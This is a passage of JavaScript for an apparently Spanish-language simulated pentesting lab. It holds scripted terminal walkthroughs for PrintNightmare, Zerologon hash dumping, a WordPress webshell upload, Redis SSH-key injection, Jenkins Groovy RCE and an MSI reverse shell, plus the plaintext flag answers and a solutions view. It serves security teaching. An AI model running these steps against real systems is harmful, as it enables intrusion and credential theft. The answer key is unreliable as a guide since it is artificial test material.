+  flags:{user:'VULN{sp00l3r_h4b1l1t4d0}',root:'VULN{cve_2021_34527_rc3}',sys:'VULN{pr1nt_n1ght_m4r3}'},
+  cmds:{
+    'rpcclient':['dim:rpcclient -U "" -N 10.10.10.31','ok:EnumPrinters: hay impresoras compartidas → spooler activo','flagU:🚩 FLAG USER (spooler habilitado) → VULN{sp00l3r_h4b1l1t4d0}','flagS:⚠ FLAG SISTEMA (servicio innecesario) → VULN{pr1nt_n1ght_m4r3}','info:💡 Explota con metasploit: msfconsole'],
+    'msfconsole':['dim:msf6 > use exploit/windows/dcerpc/printnightmare','dim:msf6 > set RHOSTS 10.10.10.31 ; run','ok:[+] Session 1 opened — SYSTEM shell','flagR:🚩 FLAG ROOT (RCE como SYSTEM) → VULN{cve_2021_34527_rc3}']
+  },
+  writeup:['El spooler de impresión expuesto permite cargar drivers maliciosos.','Metasploit tiene módulo directo → SYSTEM sin credenciales.','Lección M04: si no imprimes, deshabilita el spooler; el CVE permite movimiento lateral masivo.']
+},
+{
+  id:'zerologon', name:'ZeroDay0', ip:'10.10.12.9', os:'Windows AD', mod:'M04', diff:'hard',
+  tools:['impacket','secretsdump'], xp:{user:45,root:60,sys:20},
+  tag:'Zerologon (CVE-2020-1472): nullificación de la contraseña del DC',
+  flags:{user:'VULN{MSRPC_Netlogon}',root:'VULN{krbtgt_v4c10_4t4c4d0}',sys:'VULN{cVss_10_10_g0ld3n}'},
+  cmds:{
+    'impacket':['dim:zerologon_tester.py 10.10.10.31 dc01','err:VULNERABLE — el DC acepta MS-Netlogon con credenciales vacías','flagU:🚩 FLAG USER (vuln confirmada) → VULN{MSRPC_Netlogon}','info:💡 Tira del hilo: secretsdump'],
+    'secretsdump':['dim:secretsdump.py -no-pass -just-dc dc01','ok:hashes NTDS.dump extraídos: 1.240 cuentas','flagR:🚩 FLAG ROOT (DC comprometido) → VULN{krbtgt_v4c10_4t4c4d0}','flagS:⚠ FLAG SISTEMA (todo el dominio cae) → VULN{cVss_10_10_g0ld3n}']
+  },
+  writeup:['Un fallo criptográfico en Netlogon permite poner la contraseña del DC a vacío.','Con la cuenta del DC$: dump completo de hashes de todo el dominio.','Lección M04: Zerologon tumba un dominio entero en minutos — parcheo urgente y auditar DCs.']
+},
+{
+  id:'presshub', name:'PressHub', ip:'10.10.10.32', os:'WordPress', mod:'M05', diff:'medium',
+  tools:['wpscan','hydra','sqlmap'], xp:{user:30,root:45,sys:15},
+  tag:'WordPress: wpscan, tema vulnerable y credenciales débiles',
+  flags:{user:'VULN{wpsc4n_us3r_4dm1n}',root:'VULN{plUgin_4rb1tr4rY_upl04d}',sys:'VULN{wp_v3rs10n_6.2.1}'},
+  cmds:{
+    'wpscan':['dim:wpscan --url http://10.10.10.32 --enumerate u,ap,at','ok:[+] Usuario encontrado: admin','err:[+] Plugin vulnerable: file-manager 7.0 (arbitrary file upload)','flagS:⚠ FLAG SISTEMA (plugins desactualizados) → VULN{wp_v3rs10n_6.2.1}','flagU:🚩 FLAG USER (usuario enumerado) → VULN{wpsc4n_us3r_4dm1n}','info:💡 Ataca el login: hydra, luego el plugin: curl'],
+    'hydra':['ok:[http-post-form] login: admin  password: Adm1nWP2026','info:💡 Con sesión admin, explota el plugin: curl'],
+    'curl':['dim:POST /wp-content/plugins/file-manager/upload.php','ok:shell.php subido — webshell operativa','flagR:🚩 FLAG ROOT (RCE via plugin) → VULN{plUgin_4rb1tr4rY_upl04d}']
+  },
+  writeup:['<code>wpscan</code> enumera usuarios y plugins sin autenticación.','Contraseña débil + plugin con upload arbitrario = control total del CMS.','Lección M05: WordPress es el CMS más atacado del mundo — actualiza plugins y limita intentos de login.']
+},
+{
+  id:'redissed', name:'Redissed', ip:'10.10.10.33', os:'Linux', mod:'M06', diff:'medium',
+  tools:['nmap','redis-cli','nc'], xp:{user:30,root:45,sys:15},
+  tag:'Redis sin autenticación: de base de datos a shell',
+  flags:{user:'VULN{r3d1s_n0_p4ssw0rd}',root:'VULN{ssh_k3y_wr1tt3n}',sys:'VULN{r3d1s_7.0.11}'},
+  cmds:{
+    'nmap':['6379/tcp open redis Redis 7.0.11','flagS:⚠ FLAG SISTEMA (banner versión) → VULN{r3d1s_7.0.11}','info:💡 Conéctate: redis-cli'],
+    'redis-cli':['dim:redis-cli -h 10.10.10.33','ok:10.10.10.33:6379> PING → PONG (sin AUTH)','flagU:🚩 FLAG USER (acceso sin contraseña) → VULN{r3d1s_n0_p4ssw0rd}','info:💡 Escala: escribe tu clave SSH'],
+    'ssh':['dim:CONFIG SET dir /root/.ssh · SET authorized_keys "ssh-rsa AAAA…"','ok:Clave pública inyectada — conéctate con ssh'],
+    'nc':['dim:ssh -i id_rsa root@10.10.10.33','ok:root@redissed:~# — shell como root','flagR:🚩 FLAG ROOT (via clave SSH) → VULN{ssh_k3y_wr1tt3n}']
+  },
+  writeup:['Redis sin AUTH: cualquiera puede leer y escribir config.','<code>CONFIG SET dir</code> permite escribir archivos como root → clave SSH autorizada.','Lección M06/M02: requirepass + bind 127.0.0.1 + Redis nunca como root.']
+},
+{
+  id:'mongoking', name:'MongoKing', ip:'10.10.10.34', os:'Linux', mod:'M06', diff:'medium',
+  tools:['nmap','mongodump','strings'], xp:{user:30,root:45,sys:15},
+  tag:'MongoDB sin auth: dump completo y datos personales',
+  flags:{user:'VULN{m0ng0_n0_4uth}',root:'VULN{27017_dump_cl13nt3s}',sys:'VULN{GDPR_d4t0s_3xp0st0s}'},
+  cmds:{
+    'nmap':['27017/tcp open mongod MongoDB 6.0','info:💡 Conéctate: mongodump'],
+    'mongodump':['dim:mongodump --host 10.10.10.34 --out ./loot','ok:5 bases de datos volcadas sin credenciales','flagU:🚩 FLAG USER (dump sin auth) → VULN{m0ng0_n0_4uth}','flagS:⚠ FLAG SISTEMA (5.000 registros personales expuestos) → VULN{GDPR_d4t0s_3xp0st0s}','info:💡 Analiza el botín: strings'],
+    'strings':['dim:loot/clientes.bson | grep -i pass','err:password_hash: $2b$10$… (bcrypt débil) · DNI y emails en claro','flagR:🚩 FLAG ROOT (datos sensibles extraídos) → VULN{27017_dump_cl13nt3s}']
+  },
+  writeup:['MongoDB con bindAll y sin auth: dump completo en un comando.','Dentro: datos personales de clientes — brecha GDPR directa (M09 conexión).','Lección M06: auth obligatoria, red interna, cifrado en reposo.']
+},
+{
+  id:'pipeloot', name:'PipeLoot', ip:'10.10.10.35', os:'Jenkins', mod:'M06', diff:'hard',
+  tools:['nmap','curl','grep'], xp:{user:45,root:60,sys:20},
+  tag:'Jenkins: consola Groovy sin auth → RCE → cloud',
+  flags:{user:'VULN{gr00vy_c0ns0l3_0p3n}',root:'VULN{cr3d3nt14ls_J3nkins}',sys:'VULN{plp3l1n3_d3v_s3cr3t5}'},
+  cmds:{
+    'nmap':['8080/tcp open http Jenkins 2.350','info:💡 Panel sin login: curl'],
+    'curl':['dim:GET /script — Script Console accesible','flagU:🚩 FLAG USER (Groovy console abierta) → VULN{gr00vy_c0ns0l3_0p3n}','info:💡 Ejecuta Groovy: groovy'],
+    'groovy':['dim:println "whoami".execute().text','ok:jenkins — RCE confirmado','info:💡 Los jobs del pipeline guardan secretos: grep'],
+    'grep':['dim:Buscando credenciales en /var/jenkins_secrets…','err:AWS_SECRET_ACCESS_KEY=… · KUBE_TOKEN=… (secrets del pipeline)','flagR:🚩 FLAG ROOT (credenciales cloud y K8s) → VULN{cr3d3nt14ls_J3nkins}','flagS:⚠ FLAG SISTEMA (secretos de CI/CD expuestos) → VULN{plp3l1n3_d3v_s3cr3t5}']
+  },
+  writeup:['La Script Console de Jenkins ejecuta Groovy arbitrario en el servidor.','Los pipelines contienen secrets de AWS y Kubernetes: el CI/CD es la llave del reino.','Lección M06: nunca expongas Jenkins, y usa vault externo en vez de credenciales en jobs.']
+},
+{
+  id:'camspy', name:'CamSpy', ip:'10.10.10.36', os:'IoT', mod:'M03', diff:'easy',
+  tools:['nmap','telnet','curl'], xp:{user:15,root:30,sys:10},
+  tag:'IoT: cámara IP con credenciales de fábrica y stream abierto',
+  flags:{user:'VULN{c4m_4dm1n_4dm1n}',root:'VULN{str34m_rtsp_publ1c0}',sys:'VULN{f1rmw4r3_v13j4}'},
+  cmds:{
+    'nmap':['23/tcp open telnet · 554/tcp open rtsp · 80/tcp open http','err:| http-title: IP Camera X200 (firmware 1.0.7)','flagS:⚠ FLAG SISTEMA (firmware sin actualizar) → VULN{f1rmw4r3_v13j4}','info:💡 Prueba credenciales de fábrica: telnet'],
+    'telnet':['ok:Connected — login: admin / admin (defaults del manual)','flagU:🚩 FLAG USER (credenciales de fábrica) → VULN{c4m_4dm1n_4dm1n}','info:💡 Accede al stream: curl'],
+    'curl':['dim:rtsp://10.10.10.36:554/live — sin autenticación','ok:Stream de vídeo en directo accesible para cualquiera','flagR:🚩 FLAG ROOT (privacidad violada) → VULN{str34m_rtsp_publ1c0}']
+  },
+  writeup:['Las cámaras IP se despliegan con defaults y nunca se actualizan.','Admin:admin + stream sin auth = vigilación invertida.','Lección M03/M10: IoT en VLAN aislada, credenciales únicas y firmware al día.']
+},
+{
+  id:'alwaysinstall', name:'AlwaysTrust', ip:'10.10.10.37', os:'Windows', mod:'M02', diff:'medium',
+  tools:['msiexec','sudo'], xp:{user:25,root:40,sys:15},
+  tag:'Windows privesc: AlwaysInstallElevated y servicios con path débil',
+  flags:{user:'VULN{AIw4ys_1nst4ll_3l3v4t3d}',root:'VULN{unqu0t3d_s3rv1c3_p4th}',sys:'VULN{u4c_n0t1f1c4c10n5}'},
+  cmds:{
+    'regquery':['dim:reg query HKLM\\...\\AlwaysInstallElevated','ok:AlwaysInstallElevated = 1 (¡MSI como SYSTEM!)','flagU:🚩 FLAG USER (política insegura) → VULN{AIw4ys_1nst4ll_3l3v4t3d}','info:💡 Genera un MSI malicioso: msibuild'],
+    'msiexec':['dim:msiexec /quiet /qn /i reverse.msi','ok:Callback recibido — shell como SYSTEM','flagR:🚩 FLAG ROOT (via MSI) → VULN{unqu0t3d_s3rv1c3_p4th}','info:💡 Auditoría de servicios: services'],
+    'services':['err:Servicio "Updater" → binPath sin comillas: C:\\Program Files\\Upd\\updater.exe','err:Si mueves un exe a C:\\Program.exe: secuestro de path al reiniciar','flagS:⚠ FLAG SISTEMA (unquoted service path) → VULN{u4c_n0t1f1c4c10n5}']
+  },
+  writeup:['<code>AlwaysInstallElevated</code>: cualquier MSI se instala como SYSTEM.','Unquoted Service Path: clásico de escalada en Windows.','Lección M02: audita políticas MSI y servicios; hardening con baselines (CIS).']
+},
+{
+  id:'ghostscreen', name:'GhostScreen', ip:'10.10.10.38', os:'Linux', mod:'M02', diff:'easy',
+  tools:['nmap','vncviewer','wireshark'], xp:{user:20,root:30,sys:10},
+  tag:'VNC sin contraseña: escritorio remoto abierto',
+  flags:{user:'VULN{vnc_n0_p4ssw0rd}',root:'VULN{k3yb04rd_3sp10n4d4}',sys:'VULN{vnc_5900_1n_cl4r0}'},
+  cmds:{
+    'nmap':['5900/tcp open vnc VNC protocol (no auth)','flagS:⚠ FLAG SISTEMA (VNC sin cifrar) → VULN{vnc_5900_1n_cl4r0}','info:💡 Conéctate: vncviewer'],
+    'vncviewer':['ok:Conectado a 10.10.10.38 — escritorio root visible','flagU:🚩 FLAG USER (sesión abierta) → VULN{vnc_n0_p4ssw0rd}','info:💡 El VNC va sin cifrar: wireshark'],
+    'wireshark':['dim:Capturando tráfico del puerto 5900…','err:Teclas capturadas en claro: usuario escribiendo "sudo passwd root…"','flagR:🚩 FLAG ROOT (keylogging pasivo) → VULN{k3yb04rd_3sp10n4d4}']
+  },
+  writeup:['VNC acepta conexiones sin contraseña y sin cifrar.','Wireshark captura el tráfico: hasta las pulsaciones de tecla del admin.','Lección M02: VNC con auth + TLS, o mejor VPN + RDP con NLA.']
+},
+{
+  id:'keyless', name:'KeyLess', ip:'10.10.10.39', os:'Linux', mod:'M02', diff:'medium',
+  tools:['ssh','john','nmap'], xp:{user:25,root:40,sys:15},
+  tag:'Claves SSH: id_rsa filtrada, passphrase débil y reutilización',
+  flags:{user:'VULN{ssh_k3y_f1ltr4d4}',root:'VULN{j0hn_br34k_p4ssph4s3}',sys:'VULN{k3y_r3us0_3_srvcs}'},
+  cmds:{
+    'nmap':['22/tcp open ssh OpenSSH 8.9','info:💡 En la web de la empresa hay un backup: curl'],
+    'curl':['info:backup.tar.gz contiene .ssh/id_rsa (¡la clave privada!)','flagU:🚩 FLAG USER (clave privada filtrada) → VULN{ssh_k3y_f1ltr4d4}','info:💡 Está protegida con passphrase: john'],
+    'john':['dim:ssh2john id_rsa > hash · john hash --wordlist=rockyou.txt','ok:Passphrase: verano2026','flagR:🚩 FLAG ROOT (clave crackeada) → VULN{j0hn_br34k_p4ssph4s3}','info:💡 La clave sirve en otro servidor: ssh'],
+    'ssh':['dim:ssh -i id_rsa root@10.10.10.40 (otro host del lab)','ok:Accepted — la MISMA clave funciona en 3 servidores','flagS:⚠ FLAG SISTEMA (reutilización de claves) → VULN{k3y_r3us0_3_srvcs}']
+  },
+  writeup:['Un backup mal protegido filtra una clave privada SSH.','John rompe la passphrase de diccionario en segundos.','La misma clave abre varios servidores: reutilización fatal.','Lección M02: claves con passphrase fuerte, una por host, y nunca en backups web.']
+},
+{
+  id:'indexopen', name:'IndexOpen', ip:'10.10.10.40', os:'Elasticsearch', mod:'M06', diff:'medium',
+  tools:['nmap','curl','sqlmap'], xp:{user:30,root:45,sys:15},
+  tag:'Elasticsearch y Solr abiertos: índices corporativos al desnudo',
+  flags:{user:'VULN{3l4st1c_9200_0p3n}',root:'VULN{c0r3_b4nk1ng_1nd3x}',sys:'VULN{s0lr_l0g4j_1ns1d3}'},
+  cmds:{
+    'nmap':['9200/tcp open http Elasticsearch 7.17 · 8983/tcp Solr 8.11','info:💡 Consulta la API: curl'],
+    'curl':['dim:curl 10.10.10.40:9200/_cat/indices','ok:12 índices: logs, clientes, banking-core…','flagU:🚩 FLAG USER (índices listados sin auth) → VULN{3l4st1c_9200_0p3n}','info:💡 Extrae del índice sensible: query'],
+    'query':['err:GET banking-core/_search → IBANs y balances de 12.000 cuentas','flagR:🚩 FLAG ROOT (datos bancarios extraídos) → VULN{c0r3_b4nk1ng_1nd3x}','info:💡 El Solr 8.11 es vulnerable: searchsploit'],
+    'searchsploit':['err:Apache Solr 8.11 — afectado por Log4Shell (CVE-2021-44228)','flagS:⚠ FLAG SISTEMA (Log4j embebido) → VULN{s0lr_l0g4j_1ns1d3}']
+  },
+  writeup:['Elasticsearch con puerto abierto: la API lista todos los índices.','El índice banking-core expone IBANs: brecha crítica.','El Solr vecino lleva Log4j embebido: RCE potencial.','Lección M06: los data stores se enclavan en red interna con auth — nunca en el perímetro.']
+},
+{
+  id:'zero', name:'Zero', ip:'corp.vulnlab.es', os:'Zero Trust', mod:'M10', diff:'easy',
+  tools:['edr-status','access-request'], xp:{user:20,root:35,sys:20},
+  tag:'Zero Trust: Sophos EDR + Workspace ONE Tunnel',
+  flags:{user:'VULN{z3r0_trust_n3v3r_trust}',root:'VULN{tun3l_vpn_p0l1c13s}',sys:'VULN{mfa_s0ph0s_3dr_bl0ck}'},
+  cmds:{
+    'edr-status':['ok:Sophos EDR: proceso malicioso bloqueado en pre-ejecución ✓','flagS:⚠ FLAG SISTEMA → VULN{mfa_s0ph0s_3dr_bl0ck}','info:💡 Prueba: access-request'],
+    'access-request':['ok:Workspace ONE Tunnel: dispositivo NO conforme → acceso DENEGADO ✓','flagU:🚩 FLAG USER → VULN{z3r0_trust_n3v3r_trust}','info:💡 Prueba: mfa-policy'],
+    'mfa-policy':['ok:MFA obligatorio + mínimo privilegio: movimiento lateral bloqueado ✓','flagR:🚩 FLAG ROOT → VULN{tun3l_vpn_p0l1c13s}']
+  },
+  writeup:['Zero Trust (M10): verificar identidad, dispositivo y contexto en cada acceso.','Sophos EDR bloquea la ejecución antes de que ocurra.','Workspace ONE deniega el acceso por postura del dispositivo.','Lección: gestor de contraseñas + EDR + Zero Trust = stack corporativo moderno.']
+}
+];
+
+const TOOLS=['nmap','hydra','john','hashcat','mimikatz','metasploit','burp','repeater','intruder','decoder','ghidra','strings','nuclei','aircrack-ng','airmon-ng','airodump','steghide','binwalk','git','kerberoast','virustotal','ssh','openssl','rpcclient','impacket','secretsdump','wpscan','redis-cli','mongodump','groovy','msiexec','vncviewer','volatility','autopsy','grep','awk','zeek','elk','searchsploit','nikto','gobuster','sqlmap','wireshark','tcpdump','suricata','wazuh','responder','nc','docker','aws'];
+
+const fakeUsers=[
+  ['0xNyx','Elite Hacker',780],['p4wn3r','Pentester',520],['s1lv3rw0lf','Analista SOC',340],
+  ['n0tA1ien','Exploit Hunter',175],['kali_99','Recon Walker',85],['netrunner','Exploit Hunter',230]
+];
+
+/* ---------- HELPERS ---------- */
+const $=id=>document.getElementById(id);
+const app=$('app');
+const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+function ownedCount(m){ return ['user','root','sys'].filter(k=>S.flags[m.id+'_'+k]).length; }
+function isOwned(m){ return ownedCount(m)===3; }
+function toast(msg){ const t=$('toast'); t.innerHTML=msg; t.classList.add('show'); clearTimeout(t._h); t._h=setTimeout(()=>t.classList.remove('show'),3400); }
+function addXp(n){ S.xp+=n; save(); refreshHeader(); }
+function refreshHeader(){
+  const r=rankOf(S.xp), n=nextRank(S.xp);
+  $('rankName').textContent=r.name; $('xpTxt').textContent=S.xp+' XP';
+  const pct=n?Math.min(100,Math.round((S.xp-r.xp)/(n.xp-r.xp)*100)):100;
+  $('xpBar').style.width=pct+'%';
+}
+function flagId(mid,k){ return mid+'_'+k; }
+function submitFlag(mid,k){
+  const m=MACHINES.find(x=>x.id===mid);
+  const input=$('fl-'+mid+'-'+k);
+  if(!input) return;
+  if(input.value.trim()===m.flags[k]){
+    if(S.flags[flagId(mid,k)]){ toast('Ya tenías esta flag registrada ✔'); return; }
+    S.flags[flagId(mid,k)]=true;
+    addXp(m.xp[k]); save();
+    toast('🎉 ¡Flag correcta! <b>+'+m.xp[k]+' XP</b> — '+m.name+' · '+k.toUpperCase());
+    renderFlags(m);
+  } else toast('❌ Flag incorrecta. Sigue enumerando la máquina…');
+}
+function hint(mid,k){
+  const map={
+    user:'La flag de usuario se consigue con el primer acceso/explotación. Revisa el output de nmap y los comandos sugeridos.',
+    root:'Con acceso inicial, busca escalada o control total: cracking, SUID, credenciales filtradas… según la máquina.',
+    sys:'La flag de sistema está en banners, versiones o config expuesta (banner grabbing).'
+  };
+  toast('💡 '+map[k]);
+}
+
+/* ---------- VISTAS ---------- */
+let currentView='machines', currentMachine=null, filter='all', toolFilter='all';
+
+function view(v){
+  currentView=v;
+  ['machines','tools','solutions','ranking','profile','help'].forEach(k=>$('nav-'+k).classList.toggle('active',k===v));
+  if(v==='machines') renderMachines();
+  else if(v==='tools') renderTools();
+  else if(v==='solutions') renderSolutions();
+  else if(v==='ranking') renderRanking();
+  else if(v==='profile') renderProfile();
+  else renderHelp();
+  window.scrollTo(0,0);
+}
+
+function renderMachines(){
+  const list=MACHINES.filter(m=>(filter==='all'||m.mod===filter)&&(toolFilter==='all'||m.tools.includes(toolFilter)));
+  app.innerHTML=
+   '<h2 style="font-size:22px">Máquinas activas</h2>'
+   +'<p style="color:var(--muted);font-size:13px;margin:6px 0 18px">'+MACHINES.length+' máquinas · cada una centrada en herramientas reales (nmap, Metasploit, Wireshark, Suricata, Wazuh, John the Ripper…). Cada flag suma XP. Progreso guardado en tu navegador.</p>'
+   +'<div class="filters">'+['all','M01','M02','M03','M04','M05','M06','M07','M10'].map(f=>
+      '<button class="'+(filter===f?'on':'')+'" onclick="filter=\''+f+'\';toolFilter=\'all\';renderMachines()">'+(f==='all'?'Todas':f)+'</button>').join('')+'</div>'
+   +'<div class="filters" style="margin-top:-8px"><span style="font-size:11px;color:var(--muted);align-self:center">Herramienta:</span>'
+   +['all'].concat(TOOLS).map(t=>
+      '<button class="'+(toolFilter===t?'on':'')+'" onclick="toolFilter=\''+t+'\';renderMachines()">'+(t==='all'?'Todas':'🛠 '+t)+'</button>').join('')+'</div>'
+   +'<div class="grid">'+list.map(m=>{
+      const owned=ownedCount(m);
+      return '<div class="card" onclick="openMachine(\''+m.id+'\')">'
+      +(isOwned(m)?'<div class="owned-badge">PWNED</div>':'')
+      +'<span class="modtag">'+m.mod+'</span>'
+      +'<h3>'+esc(m.name)+'</h3><div class="os">'+m.os+' · '+esc(m.ip)+'<br>'+esc(m.tag)+'</div>'
+      +'<div style="display:flex;gap:5px;flex-wrap:wrap;margin-top:10px">'+m.tools.map(t=>'<span class="tooldot" style="font-size:11px;padding:3px 9px">🛠 '+esc(t)+'</span>').join('')+'</div>'
+      +'<span class="diff d-'+m.diff+'">'+m.diff.toUpperCase()+'</span>'
+      +'<div class="cardmeta"><span>'+(m.xp.user+m.xp.root+m.xp.sys)+' XP</span>'
+      +'<span class="pwned-dots">'+['user','root','sys'].map(k=>'<span class="dot '+(S.flags[flagId(m.id,k)]?(k==='sys'?'sys':k):'')+'"></span>').join('')+'</span>'
+      +'<span>'+owned+'/3</span></div></div>';
+    }).join('')+'</div>';
+}
+
+/* ---------- MANUAL DE SOLUCIONES ---------- */
+function renderSolutions(){
+  let h='<h2 style="font-size:22px">📖 Manual de soluciones — instructor</h2>'
+   +'<p style="color:var(--muted);font-size:13px;margin:6px 0 20px">Resolución paso a paso de las '+MACHINES.length+' máquinas: comandos en orden, qué revela cada uno y las 3 flags. Se recomienda repartir las máquinas según los módulos del curso (M01→M10).</p>';
+  MODULE_ORDER=['M01','M02','M03','M04','M05','M06','M07','M08','M10'];
+  MODULE_ORDER.forEach(mod=>{
+    const ms=MACHINES.filter(m=>m.mod===mod);
+    if(!ms.length) return;
+    h+='<div style="margin:26px 0 12px"><span class="modtag" style="font-size:13px;padding:6px 14px">'+mod+'</span></div>';
+    ms.forEach(m=>{
+      h+='<div class="writeup" style="margin-bottom:16px">'
+       +'<h3>'+esc(m.name)+' <span class="diff d-'+m.diff+'">'+m.diff.toUpperCase()+'</span> <span style="color:var(--muted);font-size:11px">'+esc(m.ip)+' · '+m.os+' · '+m.tools.join(', ')+'</span></h3>'
+       +'<p style="margin-bottom:12px">'+esc(m.tag)+'</p>'
+       +'<b style="color:var(--text)">Paso a paso:</b>'
+       +'<ol style="margin:10px 0 14px 20px;line-height:2">';
+      Object.keys(m.cmds).forEach((k,i)=>{
+        const outs=m.cmds[k];
+        /* describir qué consigue el comando según sus líneas flag/clave */
+        let resumen=[];
+        outs.forEach(l=>{
+          if(l.startsWith('flagU:')) resumen.push('🚩 <b>flag user</b>');
+          else if(l.startsWith('flagR:')) resumen.push('🚩 <b>flag root</b>');
+          else if(l.startsWith('flagS:')) resumen.push('⚠ <b>flag system</b>');
+        });
+        /* primera línea informativa como contexto */
+        const ctx=outs.find(l=>l.startsWith('info:'))||outs.find(l=>l.startsWith('err:'))||'';
+        h+='<li><code>'+esc(k)+'</code>'+(resumen.length?' → '+resumen.join(' + '):'')
+          +(ctx&&!resumen.length?'<br><span style="color:var(--muted);font-size:12px">'+esc(ctx.replace(/^(info:|err:|dim:|ok:)/,''))+'</span>':'')+'</li>';
+      });
+      h+='</ol>'
+       +'<b style="color:var(--text)">Flags:</b><table style="margin-top:8px"><tr><th>Tipo</th><th>Valor</th><th>XP</th></tr>'
+       +['user','root','sys'].map(k=>'<tr><td>'+k.toUpperCase()+'</td><td><code style="color:var(--yellow)">'+m.flags[k]+'</code></td><td>+'+m.xp[k]+' XP</td></tr>').join('')
+       +'</table>'
+       +'<div style="margin-top:12px"><b style="color:var(--orange)">Lección:</b> '+m.writeup[m.writeup.length-1]+'</div>'
+       +'<div style="margin-top:10px"><button class="btn ghost" onclick="openMachine(\''+m.id+'\')">▶ Abrir la máquina</button></div>'
+       +'</div>';
+    });
+  });
+  app.innerHTML=h;
+}
+
+/* ---------- VISTA HERRAMIENTAS ---------- */function renderTools(){
+  let h='<h2 style="font-size:22px">Herramientas del laboratorio</h2>'
+   +'<p style="color:var(--muted);font-size:13px;margin:6px 0 18px">Cada herramienta se practica en una o varias máquinas. Pulsa una para saltar a su práctica.</p><div class="grid">';
+  TOOLS.forEach(t=>{
+    const ms=MACHINES.filter(m=>m.tools.includes(t));
+    if(!ms.length) return;
+    const done=ms.filter(isOwned).length;
+    h+='<div class="card" onclick="openMachine(\''+ms[0].id+'\')">'
+     +'<h3>🛠 '+esc(t)+'</h3><div class="os">'+ms.length+' máquina(s) · '+done+' completada(s)</div>'
+     +'<div style="margin-top:10px">'+ms.map(m=>'<span class="modtag">'+m.mod+' · '+esc(m.name)+(isOwned(m)?' ✔':'')+'</span>').join(' ')+'</div>'
+     +'</div>';
+  });
+  h+='</div>';
+  app.innerHTML=h;
+}
+
+/* ---------- TERMINAL ---------- */
+function openMachine(id){
+  currentView='machine'; currentMachine=id;
+  const m=MACHINES.find(x=>x.id===id);
+  app.innerHTML=
+   '<div class="machine-head"><div><h2>'+esc(m.name)+' <span class="diff d-'+m.diff+'">'+m.diff.toUpperCase()+'</span> <span class="modtag">'+m.mod+'</span></h2>'
+   +'<div class="ip">'+esc(m.ip)+' · '+m.os+' · '+esc(m.tag)+'</div></div>'
+   +'<div style="display:flex;gap:10px;flex-wrap:wrap"><button class="btn ghost" onclick="view(\'machines\')">◀ Máquinas</button>'
+   +'<button class="btn" onclick="openMachine(\''+m.id+'\')">Reiniciar terminal</button></div></div>'
+   +'<div class="term-wrap"><div class="term-bar"><span class="tdot" style="background:#ff5f57"></span><span class="tdot" style="background:#febc2e"></span><span class="tdot" style="background:#28c840"></span>'
+   +'<span style="margin-left:8px">kali@vulnlab:~ — objetivo '+esc(m.ip)+'</span></div>'
+   +'<div id="termout"></div>'
+   +'<div class="term-input-row"><span class="prompt">┌──(kali㉿vulnlab)-[~]<br>└─$ </span><input class="term" id="termInput" placeholder="Escribe un comando… (help)" autofocus></div></div>'
+   +'<div class="flagbox" id="flagbox"></div>'
+   +'<div class="writeup hidden" id="writeup"></div>';
+  $('termInput').addEventListener('keydown',e=>{ if(e.key==='Enter') runCmd(e.target.value); });
+  tprint('<span class="info">VulnLab · '+m.mod+' — Objetivo: '+esc(m.ip)+' ('+esc(m.name)+')</span>');
+  tprint('<span class="dim">Comandos de esta máquina: <span class="cmd">'+Object.keys(m.cmds).slice(0,4).map(esc).join('</span>, <span class="cmd">')+'</span>… · <span class="cmd">help</span> para más</span>');
+  renderFlags(m);
+  $('termInput').focus();
+}
+
+function tprint(html){
+  const out=$('termout'); if(!out) return;
+  const d=document.createElement('div'); d.innerHTML=html; out.appendChild(d);
+  out.scrollTop=out.scrollHeight;
+}
+function tline(txt,cls){ tprint('<span class="'+(cls||'')+'">'+esc(txt)+'</span>'); }
+
+function runCmd(raw){
+  const m=MACHINES.find(x=>x.id===currentMachine);
+  const cmd=raw.trim();
+  $('termInput').value='';
+  tprint('<span class="cmd">┌──(kali㉿vulnlab)-[~]<br>└─$</span> '+esc(cmd));
+  if(!cmd) return;
+  const c=cmd;
+
+  if(c==='help'){
+    tline('Comandos de esta máquina:','info');
+    Object.keys(m.cmds).forEach(k=>tline('  '+k,'dim'));
+    tline('  hint — pista · clear — limpiar · exit — volver','dim');
+    return;
+  }
+  if(c==='clear'){ $('termout').innerHTML=''; return; }
+  if(c==='hint'){
+    if(!isOwned(m)) tline('💡 Pista: empieza con nmap (si aplica) y sigue las pistas 💡 del output de cada comando.','info');
+    else tline('¡Máquina completada! Revisa el writeup. 🏅','ok');
+    return;
+  }
+  if(c==='exit'){ view('machines'); return; }
+
+  /* match exacto de comando registrado; si empieza por nmap vale nmap a secas */
+  let key=m.cmds[c]!==undefined?c:(c.startsWith('nmap')&&m.cmds['nmap']!==undefined?'nmap':null);
+  /* también tolera 'aws ...' o 'docker ...' */
+  if(!key){
+    for(const k of Object.keys(m.cmds)){
+      if(k.startsWith(c+' ')||k===c){ key=k; break; }
+      if(k.split(' ')[0]===c && m.cmds[k]){ key=k; break; }
+    }
+  }
+  if(key){
+    m.cmds[key].forEach(l=>{
+      let cls='';
+      if(l.startsWith('dim:')){ cls='dim'; l=l.slice(4); }
+      else if(l.startsWith('info:')){ cls='info'; l=l.slice(5); }
+      else if(l.startsWith('err:')){ cls='err'; l=l.slice(4); }
+      else if(l.startsWith('ok:')){ cls='ok'; l=l.slice(3); }
+      else if(l.startsWith('flagU:')){ cls='flag'; l=l.slice(6); }
+      else if(l.startsWith('flagR:')){ cls='flag'; l=l.slice(6); }
+      else if(l.startsWith('flagS:')){ cls='flag'; l=l.slice(6); }
+      tline(l,cls);
+    });
+  } else {
+    tline(c+': command not found — los comandos válidos aquí: '+Object.keys(m.cmds).join(', '),'err');
+  }
+}
+
+/* ---------- FLAGS UI ---------- */
+function renderFlags(m){
+  const labels={user:'User flag',root:'Root flag',sys:'System flag'};
+  let h='<h3>Flags · '+esc(m.name)+' ('+m.mod+') · '+(m.xp.user+m.xp.root+m.xp.sys)+' XP</h3>';
+  for(const k of ['user','root','sys']){
+    const done=!!S.flags[flagId(m.id,k)];
+    h+='<div class="flagrow"><span style="min-width:90px;font-size:12px;color:var(--muted)">'+labels[k]+' (+'+m.xp[k]+')</span>'
+     +'<input id="fl-'+m.id+'-'+k+'" placeholder="VULN{...}" '+(done?'value="'+m.flags[k]+'" disabled':'')+'>'
+     +(done?'<span class="flagstate st-ok">✔ Obtenida</span>'
+           :'<button class="btn" onclick="submitFlag(\''+m.id+'\',\''+k+'\')">Enviar</button>'
+           +'<button class="hintpill" onclick="hint(\''+m.id+'\',\''+k+'\')">💡 pista</button>')
+     +'</div>';
+  }
+  if(isOwned(m)){
